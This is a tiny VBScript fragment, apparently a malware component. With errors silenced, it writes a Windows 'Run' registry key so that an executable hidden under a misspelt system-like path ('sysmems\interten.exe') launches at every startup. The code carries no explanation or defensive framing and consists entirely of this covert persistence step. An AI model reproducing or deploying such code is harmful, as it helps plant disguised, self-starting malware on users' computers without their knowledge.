on error resume next
Set src = CreateObject("Wscript.shell")
updateSP = "c:\windows\sysmems\interten.exe"
keySP = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\internte"
src.RegWrite keySP, updateSP
